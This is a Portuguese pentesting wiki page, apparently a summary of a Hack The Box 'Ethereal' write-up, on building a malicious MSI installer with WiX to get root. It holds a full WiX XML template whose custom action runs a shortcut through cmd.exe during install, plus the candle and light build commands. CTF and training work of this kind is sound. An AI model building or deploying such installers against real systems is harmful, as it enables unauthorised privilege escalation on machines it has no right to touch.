# Criando um MSI Malicioso e Obtendo Root

{{#include ../../banners/hacktricks-training.md}}

A criação do instalador MSI será feita usando wixtools; especificamente, [wixtools](http://wixtoolset.org) será utilizado. Vale mencionar que builders de MSI alternativos foram testados, mas não foram bem-sucedidos neste caso específico.<sup>[[1]](#references)</sup>

Para uma compreensão abrangente dos exemplos de uso do wix MSI, é recomendável consultar [esta página](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with). Nela, você encontrará vários exemplos que demonstram o uso do wix MSI.<sup>[[2]](#references)</sup>

O objetivo é gerar um MSI que execute o arquivo lnk. Para isso, o seguinte código XML poderia ser utilizado ([xml daqui](https://0xrick.github.io/hack-the-box/ethereal/index.html#Creating-Malicious-msi-and-getting-root)):<sup>[[1]](#references)</sup>
```html
<?xml version="1.0"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
<Product Id="*" UpgradeCode="12345678-1234-1234-1234-111111111111" Name="Example Product Name"
Version="0.0.1" Manufacturer="@_xpn_" Language="1033">
<Package InstallerVersion="200" Compressed="yes" Comments="Windows Installer Package"/>
<Media Id="1" Cabinet="product.cab" EmbedCab="yes"/>
<Directory Id="TARGETDIR" Name="SourceDir">
<Directory Id="ProgramFilesFolder">
<Directory Id="INSTALLLOCATION" Name="Example">
<Component Id="ApplicationFiles" Guid="12345678-1234-1234-1234-222222222222">
</Component>
</Directory>
</Directory>
</Directory>
<Feature Id="DefaultFeature" Level="1">
<ComponentRef Id="ApplicationFiles"/>
</Feature>
<Property Id="cmdline">cmd.exe /C "c:\users\public\desktop\shortcuts\rick.lnk"</Property>
<CustomAction Id="Stage1" Execute="deferred" Directory="TARGETDIR" ExeCommand='[cmdline]' Return="ignore"
Impersonate="yes"/>
<CustomAction Id="Stage2" Execute="deferred" Script="vbscript" Return="check">
fail_here
</CustomAction>
<InstallExecuteSequence>
<Custom Action="Stage1" After="InstallInitialize"></Custom>
<Custom Action="Stage2" Before="InstallFiles"></Custom>
</InstallExecuteSequence>
</Product>
</Wix>
```
É importante observar que o elemento Package contém atributos como InstallerVersion e Compressed, que especificam a versão do instalador e indicam, respectivamente, se o pacote está compactado ou não.

O processo de criação envolve a utilização do candle.exe, uma ferramenta do wixtools, para gerar um wixobject a partir de msi.xml. O seguinte comando deve ser executado:<sup>[[1]](#references)</sup>
```
candle.exe -out C:\tem\wix C:\tmp\Ethereal\msi.xml
```
Além disso, vale mencionar que uma imagem é fornecida na publicação, mostrando o comando e sua saída. Você pode consultá-la para obter uma orientação visual.<sup>[[1]](#references)</sup>

Além disso, light.exe, outra ferramenta do wixtools, será usada para criar o arquivo MSI a partir do wixobject. O comando a ser executado é o seguinte:<sup>[[1]](#references)</sup>
```
light.exe -out C:\tm\Ethereal\rick.msi C:\tmp\wix
```
Semelhante ao comando anterior, uma imagem é incluída no post para ilustrar o comando e sua saída.<sup>[[1]](#references)</sup>

Observe que, embora este resumo tenha como objetivo fornecer informações valiosas, recomenda-se consultar o post original para obter detalhes mais abrangentes e instruções precisas.<sup>[[1]](#references)</sup>

## Referências

- [1] [Hack The Box - Ethereal: Creating Malicious msi and getting root - 0xRick's Blog](https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root)
- [2] [A quick introduction: Create an MSI installer with WiX - CodeProject](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with) (consulte também [wixtools](http://wixtoolset.org))

{{#include ../../banners/hacktricks-training.md}}
